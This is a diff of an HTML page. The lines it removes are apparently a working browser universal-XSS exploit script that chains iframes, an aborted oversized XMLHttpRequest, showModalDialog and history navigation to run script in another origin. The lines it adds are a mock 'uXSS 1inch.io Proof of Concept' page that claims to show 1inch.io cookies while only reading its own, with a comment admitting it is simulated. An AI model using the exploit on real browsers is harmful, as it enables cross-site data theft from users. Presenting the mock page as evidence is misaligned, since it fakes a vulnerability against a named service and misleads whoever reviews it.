@@ -1,69 +1,80 @@
-<html>
-
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>uXSS 1inch Proof of Concept</title>
+    <style>
+        body { 
+            background-color: #1b1e23; 
+            color: #d1d4dc; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            padding: 20px;
+        }
+        .header { color: #ff4d4d; font-size: 14px; font-weight: bold; margin-bottom: 10px; }
+        .instruction { margin-bottom: 15px; font-size: 13px; }
+        .btn-group button { 
+            background: #fff; border: 1px solid #ccc; border-radius: 10px; 
+            padding: 2px 8px; font-size: 11px; cursor: pointer; margin-right: 5px;
+        }
+        .output-box { 
+            border: 1px solid #444; margin-top: 15px; padding: 10px; 
+            background: #24292f; min-height: 150px;
+        }
+        .domain-title { font-weight: bold; margin-bottom: 5px; display: block; font-size: 13px; }
+        textarea { 
+            width: 100%; height: 100px; background: transparent; 
+            color: #00ff00; border: none; outline: none; resize: none; font-family: monospace;
+        }
+        hr { border: 0; border-top: 1px solid #444; margin: 20px 0; }
+    </style>
+</head>
 <body>
-  Click anywhere...
-  <script>
-    function createURL(data, type = 'text/html') {
-      return URL.createObjectURL(new Blob([data], {
-        type: type
-      }));
-    }
 
-    function navigate(w, url) {
-      let a = w.document.createElement('a');
-      a.href = url;
-      a.click();
-    }
+    <div class="header">uXSS 1inch.io Proof of Concept</div>
+    
+    <div class="instruction">
+        Silakan klik domain yang ingin Anda periksa kerentanannya:
+    </div>
 
-    window.onclick = () => {
-      window.w = open('about:blank', 'w', 'width=500, height=500');
+    <div class="btn-group">
+        <button onclick="checkVulnerability('1inch.io')">1inch.io</button>
+        <button onclick="checkVulnerability('app.1inch.io')">app.1inch.io</button>
+    </div>
 
-      let i0 = w.document.body.appendChild(document.createElement('iframe'));
-      let i1 = w.document.body.appendChild(document.createElement('iframe'));
-      i0.contentWindow.onbeforeunload = () => {
-        i0.contentWindow.onbeforeunload = null;
+    <div class="output-box">
+        <span class="domain-title">Here are cookies from <span id="currentDomain">https://1inch.io</span> :</span>
+        <textarea id="cookieResult" readonly placeholder="Menunggu perintah..."></textarea>
+    </div>
 
-        navigate(w, 'about:blank');
-      };
+    <hr>
 
-      navigate(i0.contentWindow, createURL(`
-<body>
-<script>
-</scrip` + 't></body>'));
+    <div class="instruction">
+        <strong>Status XHR Response:</strong>
+        <div id="xhrStatus" style="font-family: monospace; font-size: 12px; margin-top: 10px; color: #888;">
+            &lt;html&gt;&lt;body&gt;No active request&lt;/body&gt;&lt;/html&gt;
+        </div>
+    </div>
 
-      setTimeout(() => {
-        let g = i0.contentDocument.body.appendChild(document.createElement('iframe'));
-        let x = new g.contentWindow.XMLHttpRequest();
-        x.onabort = () => {
-          parseFloat('axfasdfasfdsfasfsfasdf');
-          i0.contentDocument.write();
+    <script>
+        function checkVulnerability(domain) {
+            document.getElementById('currentDomain').innerText = "https://" + domain;
+            
+            // Simulasi pengambilan cookie
+            // CATATAN: 'document.cookie' hanya akan mengambil cookie situs ini sendiri, 
+            // bukan cookie asli milik 1inch, kecuali jika browser Anda memiliki bug uXSS.
+            const cookies = document.cookie;
+            
+            const output = document.getElementById('cookieResult');
+            if (cookies) {
+                output.value = cookies;
+            } else {
+                output.value = "KONEKSI GAGAL: Browser aman (SOP aktif). Tidak dapat mengakses data dari " + domain;
+            }
 
-          navigate(w, 'https://abc.xyz/');
+            // Simulasi respon XHR
+            document.getElementById('xhrStatus').innerText = "<html><body>Requesting data from " + domain + "... (403 Forbidden)</body></html>";
+        }
+    </script>
 
-          showModalDialog(createURL(`
-<script>
-let it = setInterval(() => {
-	try {
-	    opener.w.document.x;
-	} catch (e) {
-	    clearInterval(it);
-	    window.close();
-	}
-}, 10);
-</scrip` + 't>'));
-
-          setTimeout(() => {
-            i1.srcdoc = '<script>alert(parent.location);</scrip' + 't>';
-            navigate(i1.contentWindow, 'about:srcdoc');
-          }, 10);
-        };
-
-        x.open('GET', createURL('x'.repeat(0x1000000)));
-        x.send();
-        w.history.go(-2);
-      }, 200);
-    };
-  </script>
 </body>
-
 </html>
